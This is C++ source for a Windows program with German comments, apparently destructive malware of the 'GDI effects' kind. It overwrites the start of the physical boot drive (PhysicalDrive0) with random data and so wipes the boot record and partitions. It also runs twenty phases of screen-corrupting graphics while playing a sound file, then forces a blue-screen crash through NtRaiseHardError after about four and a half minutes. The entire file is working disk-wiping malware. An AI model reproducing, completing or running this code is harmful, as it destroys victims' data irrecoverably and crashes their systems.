#include <windows.h>

// Wichtige PlaySound-Flags für den CRT-freien Modus
#ifndef SND_ASYNC
#define SND_ASYNC 0x0001
#endif
#ifndef SND_FILENAME
#define SND_FILENAME 0x00020000L
#endif

// Globale Definitionen für die Festplatten-Überschreibung
const DWORD BLOCK_SIZE = 65536; // 64 KB Blockgröße
static BYTE diskBuffer[BLOCK_SIZE]; // Global deklariert

// Funktionsprototyp für den nativen NT-Fehler aus ntdll.dll
typedef NTSTATUS(NTAPI* pfnNtRaiseHardError)(
    NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response
);

// Holt Privilegien für den Systemabsturz (Jetzt mit korrektem Array-Index [0])
void EnableShutdownPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
        CloseHandle(hToken);
    }
}

// Führt den harten Systemabsturz aus
void TriggerHardError() {
    EnableShutdownPrivilege();
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        pfnNtRaiseHardError NtRaiseHardError = (pfnNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
        if (NtRaiseHardError) {
            ULONG response;
            NtRaiseHardError(0xC000000A, 0, 0, NULL, 6, &response); 
        }
    }
    UINT_PTR* p = NULL; *p = 0xFFFFFFFF; 
}

// 32-Bit Zufallsgenerator (LCG)
static unsigned int next_random = 1;
int CustomRandom(int max) {
    if (max <= 0) return 0;
    next_random = next_random * 1103515245 + 12345;
    return (int)((next_random / 65536) % max);
}

// Sinus-Approximation für Phase 14
int CustomSinOffset(int tick) {
    int angle = tick % 360;
    if (angle < 0) angle += 360;
    if (angle < 180) return (angle - 90) / 10;
    return (270 - angle) / 10;
}

// Füllt einen Puffer mit byte-basiertem Zufallsmüll
void FillWithTrash(BYTE* buffer, DWORD size) {
    for (DWORD i = 0; i < size; i++) {
        buffer[i] = (BYTE)CustomRandom(256);
    }
}

// Reiner Win32-Einstiegspunkt
extern "C" int __stdcall WinMainCRTStartup() {
    next_random = (unsigned int)GetTickCount();

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    
    const DWORD P_DUR = 9000; 
    DWORD pStart = GetTickCount();
    
    // Timer für den Systemabsturz (4 Min 42 Sek = 282.000 Millisekunden)
    DWORD crashStartTimer = GetTickCount();
    const DWORD CRASH_DELAY = 282000;

    int phase = 1;

    // Startet die WAV-Datei im Hintergrund
    PlaySoundA("Aufnahme.wav", NULL, SND_FILENAME | SND_ASYNC);
    
    // Low-Level-Festplatten-Zugriff vorbereiten
    HANDLE hDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DWORD blocksWritten = 0;
    const DWORD TOTAL_BLOCKS = 8192;

    Sleep(100);

    while (1) {
        if (GetTickCount() - crashStartTimer >= CRASH_DELAY) {
            if (hDisk != INVALID_HANDLE_VALUE) CloseHandle(hDisk);
            TriggerHardError();
        }

        if (hDisk != INVALID_HANDLE_VALUE && blocksWritten < TOTAL_BLOCKS) {
            FillWithTrash(diskBuffer, BLOCK_SIZE);
            DWORD bytesWritten;
            if (WriteFile(hDisk, diskBuffer, BLOCK_SIZE, &bytesWritten, NULL)) {
                blocksWritten++;
            }
        }

        HDC hdc = GetDC(NULL);
        if (hdc != NULL) {
            switch (phase) {
                case 1: {
                    for (int i = 0; i < 200; i++) 
                        SetPixel(hdc, CustomRandom(w), CustomRandom(h), RGB(CustomRandom(256), CustomRandom(256), CustomRandom(256)));
                    break;
                }
                case 2: {
                    HPEN pen = CreatePen(PS_SOLID, 2, RGB(CustomRandom(256), CustomRandom(256), CustomRandom(256)));
                    SelectObject(hdc, pen); MoveToEx(hdc, CustomRandom(w), CustomRandom(h), NULL);
                    LineTo(hdc, CustomRandom(w), CustomRandom(h)); DeleteObject(pen);
                    break;
                }
                case 3: {
                    BitBlt(hdc, (CustomRandom(9)) - 4, 0, w, h, hdc, 0, 0, SRCCOPY);
                    break;
                }
                case 4: {
                    BitBlt(hdc, 0, (CustomRandom(9)) - 4, w, h, hdc, 0, 0, SRCCOPY);
                    break;
                }
                case 5: {
                    BitBlt(hdc, 4, 4, w - 8, h - 8, hdc, 0, 0, SRCCOPY);
                    break;
                }
                case 6: {
                    HBRUSH br = CreateSolidBrush(RGB(CustomRandom(256), CustomRandom(256), CustomRandom(256)));
                    SelectObject(hdc, br); int r = CustomRandom(60) + 10, x = CustomRandom(w), y = CustomRandom(h);
                    Ellipse(hdc, x - r, y - r, x + r, y + r); DeleteObject(br);
                    break;
                }
                case 7: {
                    int x = CustomRandom(w), size = CustomRandom(150) + 20;
                    BitBlt(hdc, x, CustomRandom(8) + 1, size, h, hdc, x, 0, SRCCOPY);
                    break;
                }
                case 8: {
                    if (CustomRandom(15) == 0) BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, DSTINVERT);
                    break;
                }
                case 9: {
                    DrawIcon(hdc, CustomRandom(w), CustomRandom(h), LoadIcon(NULL, IDI_WARNING));
                    break;
                }
                case 10: {
                    DrawIcon(hdc, CustomRandom(w), CustomRandom(h), LoadIcon(NULL, IDI_ERROR));
                    break;
                }
                case 11: {
                    SetTextColor(hdc, RGB(CustomRandom(256), CustomRandom(256), CustomRandom(256)));
                    SetBkMode(hdc, TRANSPARENT); TextOutA(hdc, CustomRandom(w), CustomRandom(h), "CRITICAL ERROR", 14);
                    break;
                }
                case 12: {
                    BitBlt(hdc, CustomRandom(w), CustomRandom(h), 200, 200, hdc, CustomRandom(w), CustomRandom(h), SRCCOPY);
                    break;
                }
                case 13: {
                    int x = CustomRandom(w), y = CustomRandom(h), s = CustomRandom(300);
                    BitBlt(hdc, x, y, s, s, hdc, CustomRandom(w), CustomRandom(h), 0x00660046);
                    break;
                }
                case 14: {
                    int i = CustomRandom(h);
                    int offset = CustomSinOffset(i + (int)GetTickCount());
                    BitBlt(hdc, offset, i, w, 4, hdc, 0, i, SRCCOPY);
                    break;
                }
                case 15: {
                    HBRUSH br = CreateSolidBrush(RGB(CustomRandom(256), CustomRandom(256), CustomRandom(256)));
                    SelectObject(hdc, br); PatBlt(hdc, CustomRandom(w), CustomRandom(h), CustomRandom(400), CustomRandom(400), PATINVERT);
                    DeleteObject(br); break;
                }
                case 16: { 
                    int y = CustomRandom(h);
                    int size = CustomRandom(50) + 10;
                    // Verschiebt einen horizontalen Balken um einige Pixel nach unten
                    BitBlt(hdc, 0, y + CustomRandom(6) + 1, w, size, hdc, 0, y, SRCCOPY);
                    break;
                }
                case 17: { 
                    int rw = CustomRandom(w / 2) + 100;
                    int rh = CustomRandom(h / 2) + 100;
                    int rx = CustomRandom(w - rw);
                    int ry = CustomRandom(h - rh);
                    // Invertiert nur einen zufälligen Teilbereich des Bildschirms
                    BitBlt(hdc, rx, ry, rw, rh, hdc, rx, ry, DSTINVERT);
                    break;
                }
                case 18: { 
                    int size = CustomRandom(200) + 50;
                    int srcX = CustomRandom(w - size);
                    int srcY = CustomRandom(h - size);
                    int destX = CustomRandom(w - size);
                    int destY = CustomRandom(h - size);
                    BitBlt(hdc, destX, destY, size, size, hdc, srcX, srcY, SRCCOPY);
                    break;
                }
                case 19: { 
                    // Verschiebt den Bildschirm minimal um sich selbst
                    int dirX = (CustomRandom(3)) - 1; // -1, 0 oder 1
                    int dirY = (CustomRandom(3)) - 1; // -1, 0 oder 1
                    BitBlt(hdc, dirX, dirY, w - 2, h - 2, hdc, 1, 1, SRCCOPY);
                    break;
                }
                case 20: {
                    int sizeX = CustomRandom(150) + 50;
                    int sizeY = CustomRandom(150) + 50;
                    int srcX  = CustomRandom(w - sizeX);
                    int srcY  = CustomRandom(h - sizeY);
                    int destX = CustomRandom(w - sizeX);
                    int destY = CustomRandom(h - sizeY);
                    // Kombiniert Invertierung (SRCINVERT / XOR) mit Verschiebung
                    BitBlt(hdc, destX, destY, sizeX, sizeY, hdc, srcX, srcY, 0x00660046); 
                    if (CustomRandom(5) == 0) {
                        BitBlt(hdc, destX, destY, sizeX, sizeY, hdc, destX, destY, DSTINVERT);
                    }
                    break;
                }

            }
            ReleaseDC(NULL, hdc);
        }

        if (GetTickCount() - pStart >= P_DUR) {
            phase++; pStart = GetTickCount();
            if (phase > 20) phase = 1;
        }
        Sleep(5);
    }
    return 0;
}
